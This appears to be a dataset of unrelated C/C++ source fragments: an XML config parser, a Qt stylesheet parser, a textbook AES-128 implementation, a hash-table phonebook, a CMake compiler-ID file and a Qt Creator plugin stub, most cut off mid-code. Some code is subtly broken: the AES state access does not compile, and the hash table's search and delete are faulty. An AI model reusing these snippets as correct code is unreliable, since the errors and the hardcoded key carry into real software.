IPACM_read_content_element\n(\n\t xmlNode* element\n)\n{\n\txmlNode* child_ptr;\n\n\tfor (child_ptr  = element->children;\n\t\t\t child_ptr != NULL;\n\t\t\t child_ptr  = child_ptr->next)\n\t{\n\t\tif (child_ptr->type == XML_TEXT_NODE)\n\t\t{\n\t\t\treturn (char*)child_ptr->content;\n\t\t}\n\t}\n\treturn NULL;\n}\n\n/* insensitive comparison of a libxml's string (xml_str) and a regular string (str)*/\nstatic int32_t IPACM_util_icmp_string\n(\n\t const char* xml_str,\n\t const char* str\n)\n{\n\tint32_t ret = -1;\n\n\tif (NULL != xml_str && NULL != str)\n\t{\n\t\tuint32_t len1 = strlen(str);\n\t\tuint32_t len2 = strlen(xml_str);\n\t\t/* If the lengths match, do the string comparison */\n\t\tif (len1 == len2)\n\t\t{\n\t\t\tret = strncasecmp(xml_str, str, len1);\n\t\t}\n\t}\n\n\treturn ret;\n}\n\n/* This function read IPACM XML and populate the IPA CM Cfg */\nint ipacm_read_cfg_xml(char *xml_file, IPACM_conf_t *config)\n{\n\txmlDocPtr doc = NULL;\n\txmlNode* root = NULL;\n\tint ret_val = IPACM_SUCCESS;\n\n\t/* Invoke the XML parser and obtain the parse tree */\n\tdoc = xmlReadFile(xml_file, \"UTF-8\", XML_PARSE_NOBLANKS);\n\tif (doc == NULL) {\n\t\tIPACMDBG_H(\"IPACM_xml_parse: libxml returned parse error!\\n\");\n\t\treturn IPACM_FAILURE;\n\t}\n\n\t/*Get the root of the tree*/\n\troot = xmlDocGetRootElement(doc);\n\n\tmemset(config, 0, sizeof(IPACM_conf_t));\n\n\t/* parse the xml tree returned by libxml */\n\tret_val = ipacm_cfg_xml_parse_tree(root, config);\n\n\tif (ret_val != IPACM_SUCCESS)\n\t{\n\t\tIPACMDBG_H(\"IPACM_xml_parse: ipacm_cfg_xml_parse_tree returned parse error!\\n\");\n\t}\n\n\t/* Free up the libxml's parse tree */\n\txmlFreeDoc(doc);\n\n\treturn ret_val;\n}\n\n/* This function traverses the xml tree*/\nstatic int ipacm_cfg_xml_parse_tree\n(\n\t xmlNode* xml_node,\n\t IPACM_conf_t *config\n)\n{\n\tint32_t ret_val = IPACM_SUCCESS;\n\tint str_size;\n\tchar* content;\n\tchar content_buf[MAX_XML_STR_LEN];\n\n\tif (NULL == xml_node)\n\t\treturn ret_val;\n\twhile ( xml_node != NULL &&\n\t\t\t\t ret_val == IPACM_SUCCESS)\n\t{\n\t\tswitch (xml_node->type)\n\t\t{\n\t\tcase XML_ELEMENT_NODE:\n\t\t\t{\n\t\t\t\tif (IPACM_util_icmp_string((char*)xml_node->name, system_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, ODU_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, IPACMCFG_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, IPACMIFACECFG_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, IFACE_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, IPACMPRIVATESUBNETCFG_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, SUBNET_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, IPACMALG_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, ALG_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, IPACMNat_TAG) == 0 ||\n\t\t\t\t\t\tIPACM_util_icmp_string((char*)xml_node->name, IP_PassthroughFlag_TAG",
    "#include \"qutils.h\"\n\n// \u89e3\u6790\u67d0\u4e00\u4e2a\u5177\u4f53\u7684\u6837\u5f0f\nQMap<QString, QString> parseStyleSettings(const QString &style) {\n    QMap<QString, QString> settings;\n\n    // \u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d {} \u4e2d\u7684\u5185\u5bb9\n    static QRegularExpression re(\"\\\\{([^}]*)\\\\}\");\n    QRegularExpressionMatchIterator i = re.globalMatch(style);\n\n    QStringList contents;\n    while (i.hasNext()) {\n        QRegularExpressionMatch match = i.next();\n        contents << match.captured(1); // \u63d0\u53d6 {} \u4e2d\u7684\u5185\u5bb9\n    }\n\n    // \u62fc\u63a5\u5185\u5bb9\u5e76\u7528 ; \u5206\u5272\n    QString joinedContents = contents.join(\";\");\n    QStringList settingsList = joinedContents.split(\";\");\n\n    // \u5b58\u50a8\u952e\u540d\u8bfb\u5165\u987a\u5e8f\u7684\u5b57\u7b26\u4e32\n    QString order = \"\";\n\n    // \u5206\u5272\u6bcf\u4e00\u9879\u5e76\u5b58\u5165 QMap\n    for (const QString &setting : settingsList) {\n        QStringList keyValue = setting.split(\":\");\n        if (keyValue.size() == 2) {\n            settings.insert(keyValue[0].trimmed(), keyValue[1].trimmed());\n            order += keyValue[0].trimmed() + \";\";\n        }\n    }\n\n    settings.insert(\"Order\", order);\n\n    return settings;\n}\n\n// \u89e3\u6790\u6574\u4e2a\u6837\u5f0f\u8868\nQMap<QString, QMap<QString, QString>> parseStyleSheet(const QString &style) {\n    QMap<QString, QMap<QString, QString>> parsed_style_sheet;\n\n    QVector<int> openBracePositions;\n    QVector<int> closeBracePositions;\n\n    // \u627e\u5230\u6240\u6709 { \u7684\u4f4d\u7f6e\n    int openBraceIndex = style.indexOf('{');\n    while (openBraceIndex != -1) {\n        openBracePositions.append(openBraceIndex);\n        openBraceIndex = style.indexOf('{', openBraceIndex + 1);\n    }\n\n    // \u627e\u5230\u6240\u6709 } \u7684\u4f4d\u7f6e\n    int closeBraceIndex = style.indexOf('}');\n    while (closeBraceIndex != -1) {\n        closeBracePositions.append(closeBraceIndex);\n        closeBraceIndex = style.indexOf('}', closeBraceIndex + 1);\n    }\n\n    QString order = \"\";\n\n    // \u904d\u5386\u6bcf\u4e00\u4e2a { \u5e76\u4e0e\u524d\u4e00\u4e2a } \u622a\u83b7\u5f53\u524d qss \u7684\u4f5c\u7528\u5bf9\u8c61\n    for (auto i = 0; i < openBracePositions.size(); i++) {\n        int start_index = (i==0) ? 0 : (closeBracePositions[i-1]+1);\n        QString domain = style.mid(start_index,\n                                   openBracePositions[i]-start_index);\n        QString style_settings = style.mid(openBracePositions[i],\n                                           closeBracePositions[i]-openBracePositions[i]+1);\n        // \u52a0\u5165 Map\n        parsed_style_sheet.insert(domain.trimmed(),\n                                  parseStyleSettings(style_settings));\n        order += domain.trimmed() + \";\";\n    }\n\n    parsed_style_sheet.insert(\"Order\", {{\"Order\", order}});\n\n    return parsed_style_sheet;\n}\n\nQString generateQSS(QMap<QString, QMap<QString, QString>> styleMap) {\n    QString qss = \"\";\n    QVector<QString> keys;\n    QString order = styleMap[\"Order\"][\"Order\"];\n\n    QString tmp = \"\";\n    for (auto i = 0; i < order.size(); i++) {\n        if (order[i] != ';') {\n            tmp += order[i];\n        }\n        else {\n            keys.append(tmp);\n            tmp = \"\";\n        }\n    }\n\n    // \u904d\u5386\u952e\u540d\n    for (auto i = 0; i < keys.size(); i++) {\n        QString key = keys[i];\n        qss += key + \" {\\n\";\n        QMap<QString, QString> subMap = styleMap[key];\n        // \u83b7\u53d6\u5b50\u8868\u8bed\u53e5\u987a\u5e8f\n        QVector<QString> sub_keys;\n        QString sub_order = subMap[\"Order\"];\n        for (auto j = 0; j < sub_order.size(); j++) {\n            if (sub_order[j] != ';') {\n                tmp += sub_order[j];\n            }\n            else {\n                sub_keys.append(tmp);\n                tmp = \"\";\n            }\n        }\n        // \u904d\u5386\u8be5\u5bf9\u8c61\u6bcf\u4e00\u6761qss\u6837\u5f0f\u8bbe\u7f6e\n        for (auto j = 0; j < sub_keys.size(); j++) {\n            qss += \"\\t\" + sub_keys[j] + \": \" + subMap[sub_keys[j]] + \";\\n\";\n        }\n        qss += \"\\n}\";\n    }\n    // qDebug()<<qss;\n    return qss;\n}\n\n\n// \u5728\u63a7\u4ef6\u539f\u672c\u7684 QSS \u57fa\u7840\u4e0a \u66f4\u65b0\u5176 QSS\nvoid updateStyleSheet(QWidget* item, QString new_style) {\n    QString ori_style = item->styleSheet();\n    // \u5206\u522b\u89e3\u6790\u539f\u6709\u548c\u73b0\u6709\u7684 QSS \u8868\n    QMap<QString, QMap<QString, QString>> parsed_ori = parseStyleSheet(ori_style);\n    QMap<QString, QMap<QString, QString>> parsed_new = parseStyleSheet(new_style);\n    // \u6839\u636e Order \u904d\u5386\u65b0\u8868\u7684\u952e\u503c\u5bf9 \u7136\u540e\u66f4\u65b0\u5df2\u6709\u7684\u503c \u52a0\u5165\u65b0\u6765\u7684\u503c\n    QVector<QString> keys;\n    QString order = parsed_new[\"Order\"][\"Order\"];\n\n    QString tmp = \"\";\n    for (auto i = 0; i < order.size(); i++) {\n        if (order[i] != ';') {\n            tmp += order[i];\n        }\n        else {\n            keys.append(tmp);\n            tmp = \"\";\n        }\n    }\n\n    for (auto i = 0; i < keys.size(); i++) {\n        if (parsed_ori.contains(keys[i])) {\n            // \u83b7\u53d6\u8be5\u7c7b\u578b\u7684 qss \u8bed\u53e5\u987a\u5e8f\n            QVector<QString> sub_keys;\n            QString sub_order = parsed_new[keys[i]][\"Order\"];\n            for (auto j = 0; j < sub_order.size(); j++) {\n                if (sub_order[j] != ';') {\n                    tmp += sub_order[j];\n                }\n                else {\n                    sub_keys.append(tmp);\n                    tmp = \"\";\n                }\n            }\n            // \u66f4\u65b0\u5df2\u6709\u952e\u540d\u7684\u503c\u5e76\u66f4\u65b0Order\n            for (auto j = 0; j < sub_keys.size(); j++) {\n                if (!parsed_ori[keys[i]].contains(sub_keys[j])) {\n                    // \u5c06\u65b0\u952e\u540d\u5c3e\u7f00\u5165order\n                    parsed_ori[keys[i]][\"Order\"] += sub_keys[j] + \";\";\n                }\n   ",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <cstdint>\r\n#include <array>\r\n\r\nusing namespace std;\r\n\r\nconst int Nb = 4;\r\nconst int Nk = 4;\r\nconst int Nr = 10;\r\n\r\nusing state_t = array<array<uint8_t, 4>, 4>;\r\nstate_t state;\r\n\r\narray<uint8_t, 176> RoundKey;\r\narray<uint8_t, 16> Key = {\r\n    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,\r\n    0xab, 0xf7, 0xcf, 0x45, 0x9f, 0x4f, 0x6a, 0x4b\r\n};\r\n\r\narray<uint8_t, 256> sbox = {\r\n    // S-box values\r\n    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\r\n    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\r\n    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\r\n    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\r\n    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\r\n    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\r\n    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\r\n    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\r\n    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\r\n    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\r\n    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\r\n    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\r\n    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\r\n    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\r\n    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\r\n    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16\r\n};\r\n\r\narray<uint8_t, 11> Rcon = {\r\n    0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36\r\n};\r\n\r\nvoid KeyExpansion() {\r\n    uint32_t i, j, k;\r\n    uint8_t tempa[4];\r\n\r\n    for (i = 0; i < Nk; ++i) {\r\n        RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];\r\n        RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];\r\n        RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];\r\n        RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];\r\n    }\r\n\r\n    for (i = Nk; i < Nb * (Nr + 1); ++i) {\r\n        k = (i - 1) * 4;\r\n        tempa[0] = RoundKey[k + 0];\r\n        tempa[1] = RoundKey[k + 1];\r\n        tempa[2] = RoundKey[k + 2];\r\n        tempa[3] = RoundKey[k + 3];\r\n\r\n        if (i % Nk == 0) {\r\n            const uint8_t u8tmp = tempa[0];\r\n            tempa[0] = sbox[tempa[1]] ^ Rcon[i / Nk];\r\n            tempa[1] = sbox[tempa[2]];\r\n            tempa[2] = sbox[tempa[3]];\r\n            tempa[3] = sbox[u8tmp];\r\n        }\r\n\r\n        j = i * 4;\r\n        k = (i - Nk) * 4;\r\n        RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];\r\n        RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];\r\n        RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];\r\n        RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];\r\n    }\r\n}\r\n\r\nvoid AddRoundKey(uint8_t round) {\r\n    for (uint8_t i = 0; i < 4; ++i) {\r\n        for (uint8_t j = 0; j < 4; ++j) {\r\n            (*state)[i][j] ^= RoundKey[round * Nb * 4 + i * Nb + j];\r\n        }\r\n    }\r\n}\r\n\r\nvoid SubBytes() {\r\n    for (uint8_t i = 0; i < 4; ++i) {\r\n        for (uint8_t j = 0; j < 4; ++j) {\r\n            (*state)[i][j] = sbox[(*state)[i][j]];\r\n        }\r\n    }\r\n}\r\n\r\nvoid ShiftRows() {\r\n    uint8_t temp;\r\n\r\n    temp = (*state)[1][0];\r\n    (*state)[1][0] = (*state)[1][1];\r\n    (*state)[1][1] = (*state)[1][2];\r\n    (*state)[1][2] = (*state)[1][3];\r\n    (*state)[1][3] = temp;\r\n\r\n    temp = (*state)[2][0];\r\n    (*state)[2][0] = (*state)[2][2];\r\n    (*state)[2][2] = temp;\r\n    temp = (*state)[2][1];\r\n    (*state)[2][1] = (*state)[2][3];\r\n    (*state)[2][3] = temp;\r\n\r\n    temp = (*state)[3][0];\r\n    (*state)[3][0] = (*state)[3][3];\r\n    (*state)[3][3] = (*state)[3][2];\r\n    (*state)[3][2] = (*state)[3][1];\r\n    (*state)[3][1] = temp;\r\n}\r\n\r\n#define xtime(x) ((x<<1) ^ (((x>>7) & 1) * 0x1b))\r\n\r\nvoid MixColumns() {\r\n    uint8_t Tmp, Tm, t;\r\n    for (int i = 0; i < 4; ++i) {\r\n        t = (*state)[i][0];\r\n        Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3];\r\n        Tm = (*state)[i][0] ^ (*state)[i][1]; Tm = xtime(Tm); (*state)[i][0] ^= Tm ^ Tmp;\r\n        Tm = (*state)[i][1] ^ (*state)[i][2]; Tm = xtime(Tm); (*state)[i][1] ^= Tm ^ Tmp;\r\n        Tm = (*state)[i][2] ^ (*state)[i][3]; Tm = xtime(Tm); (*state)[i][2] ^= Tm ^ Tmp;\r\n        Tm = (*state)[i][3] ^ t;              Tm = xtime(Tm); (*state)[i][3] ^= Tm ^ Tmp;\r\n    }\r\n}\r\n\r\nvoid Cipher() {\r\n    AddRoundKey(0);\r\n\r\n    for (uint8_t round = 1; round < Nr; ++round) {\r\n        SubBytes();\r\n        ShiftRows();\r\n        MixColumns();\r\n        ",
    "/*Implement all the functions of a dictionary (ADT) using hashing and handle collisions using\r\nchaining with / without replacement.\r\nData: Set of (key, value) pairs, Keys are mapped to values, Keys must be comparable,\r\nKeys must be unique. Standard Operations: Insert(key, value), Find(key), Delete(key)*/\r\n\r\n#include <iostream>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\nusing namespace std;\r\n\r\nclass Node\r\n{\r\npublic:\r\nint data;\r\nstring name;\r\nstring mobile;\r\nNode *next;\r\n};\r\n\r\nclass Hash{\r\n    public:\r\n        Node *hash_table[10];\r\n        Node *createNode(int x,string a,string b);\r\n        Node *temp;\r\n\r\n        int hash_function(int val);\r\n        void display();\r\n        int Search(int data);\r\n        void Insert(int data,string name,string mobile);\r\n        void Delete(int data);\r\n        \r\n        Hash(){\r\n            for(int i=0;i<10;i++){\r\n                hash_table[i]=NULL;\r\n            }\r\n        }\r\n\r\n};\r\n\r\nint Hash::hash_function(int data){\r\n    return data%10;\r\n}\r\n\r\nNode *Hash::createNode(int x,string a,string b){\r\n    Node *temp=new Node;\r\n    temp->data=x;\r\n    temp->next=NULL;\r\n    temp->name=a;\r\n    temp->mobile=b;\r\n    return temp;\r\n}\r\n\r\nvoid Hash::display(){\r\n    cout<<\"\\n\";\r\n    for(int i=0;i<10;i++){\r\n        temp=new Node;\r\n        temp=hash_table[i];\r\n        cout<<i<<\" : \";\r\n        while(temp!=NULL){\r\n            cout<<\"  ->  \"<<temp->data<<\" - \"<<temp->name<<\" - \"<<temp->mobile;\r\n            temp=temp->next;\r\n        }\r\n        cout<<endl;\r\n    }\r\n}\r\nvoid Hash::Insert(int data,string name,string mobile){\r\n    int hash_value=hash_function(data);\r\n    Node *temp=new Node;\r\n    Node *head=new Node;\r\n    head=createNode(data,name,mobile);\r\n    temp=hash_table[hash_value];\r\n    if(temp==NULL){\r\n        hash_table[hash_value]=head;\r\n    }\r\n    else{\r\n        while(temp->next!=NULL){\r\n            temp=temp->next;\r\n        }\r\n        temp->next=head;\r\n    }\r\n}\r\n\r\nint Hash::Search(int data){\r\n\tbool flag = 0;\r\n\tint hash_value = hash_function(data);\r\n\tNode *newNode = hash_table[hash_value];\r\n\r\n\tcout<<\"\\nElement found at : \";\r\n\twhile (newNode != NULL)\r\n\t{\r\n\tif (newNode->data==data)\r\n\t{\r\n\t\tcout<<hash_value<<\" : \"<<newNode->data<<endl;\r\n\t\tflag = 1;\r\n\t}\r\n\tnewNode = newNode->next;\r\n\t}\r\n\tif (!flag)\r\n\treturn -1;\r\n}\r\n\r\nvoid Hash::Delete(int data){\r\n    int hash_value = hash_function(data);\r\n    Node *newNode = hash_table[hash_value];\r\n    if(newNode==NULL){\r\n        cout<<\"NOT FOUND\\n\";\r\n        return;\r\n    }\r\n    if (newNode->data==data){\r\n        hash_table[hash_value]=newNode->next;\r\n        \r\n        return;\r\n    }\r\n    while ((newNode->next)->data != data){\r\n\t\tnewNode = newNode->next;\r\n\t}\r\n\t\tnewNode->next=(newNode->next)->next;\r\n}\r\n\r\nint main(){\r\n    Hash H;\r\n    string name,mobile;\r\n    int data,Skey,Dkey,ch;\r\n    char res;\r\n    do{\r\n        cout<<\"-------------------------MENU-------------------------\\n\";\r\n        cout<<\"1.Press 1 to INSERT new newNode\\n2.Press 2 to DISPLAY the phonebook\\n3.Press 3 to SEARCH an element\\n4.Press 4 to DELETE an element\\n\\n\";\r\n        cin>>ch;\r\n        switch(ch){\r\n            case 1:\r\n                cout<<\"Enter data to INSERT\\t\"; //data is roll no or any key\r\n                cin>>data;\r\n                cout<<\"Name: \\t\";\r\n                cin>>name;\r\n                cout<<\"Mobile: \\t\";\r\n                cin>>mobile;\r\n                H.Insert(data,name,mobile);\r\n                break;\r\n            case 2:\r\n                cout<<\"-------------------------PHONEBOOK-------------------------\\n\";\r\n                H.display();\r\n                break;\r\n            case 3:\r\n                cout<<\"Enter the data to be searched\\t\";\r\n                cin>>Skey;\r\n                if(H.Search(Skey)==-1){\r\n                    cout<<\"NOT FOUND\\n\";\r\n                    continue;\r\n                }\r\n                break;\r\n            case 4:\r\n                cout<<\"Enter the data to be deleted\\t\";\r\n                cin>>data;\r\n                H.Delete(data);\r\n                cout<<\"DELETED\\n\";\r\n                break;\r\n            case 5:\r\n                exit(0);\r\n        }\r\n        cout<<\"Do you want to continue(y/n)\\n\";\r\n        cin>>res;\r\n    }while(res=='Y'||res=='y');\r\n}\r\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"myplugintestconstants.h\"\n#include \"myplugintesttr.h\"\n\n#include <coreplugin/actionmanager/actioncontainer.h>\n#include <coreplugin/actionmanager/actionmanager.h>\n#include <coreplugin/actionmanager/command.h>\n#include <coreplugin/coreconstants.h>\n#include <coreplugin/icontext.h>\n#include <coreplugin/icore.h>\n\n#include <extensionsystem/iplugin.h>\n\n#include <QAction>\n#include <QMainWindow>\n#include <QMenu>\n#include <QMessageBox>\n\nnamespace Myplugintest::Internal {\n\nclass MyplugintestPlugin : public ExtensionSystem::IPlugin\n{\n    Q_OBJECT\n    Q_PLUGIN_METADATA(IID \"org.qt-project.Qt.QtCreatorPlugin\" FILE \"Myplugintest.json\")\n\npublic:\n    MyplugintestPlugin();\n    ~MyplugintestPlugin() override;\n\n    void initialize() override;\n    void extensionsInitialized() override;\n    ShutdownFlag aboutToShutdown() override;\n\nprivate:\n    void triggerAction();\n};\n\nMyplugintestPlugin::MyplugintestPlugin()\n{\n    // Create your members\n}\n\nMyplugintestPlugin::~MyplugintestPlugin()\n{\n    // Unregister objects from the plugin manager's object pool\n    // Delete members\n}\n\nvoid MyplugintestPlugin::initialize()\n{\n    // Register objects in the plugin manager's object pool\n    // Load settings\n    // Add actions to menus\n    // Connect to other plugins' signals\n    // In the initialize function, a plugin can be sure that the plugins it\n    // depends on have initialized their members.\n\n    // If you need access to command line arguments or to report errors, use the\n    //    bool IPlugin::initialize(const QStringList &arguments, QString *errorString)\n    // overload.\n\n    auto action = new QAction(Tr::tr(\"Myplugintest Action\"), this);\n    Core::Command *cmd = Core::ActionManager::registerAction(action,\n                                                             Constants::ACTION_ID,\n                                                             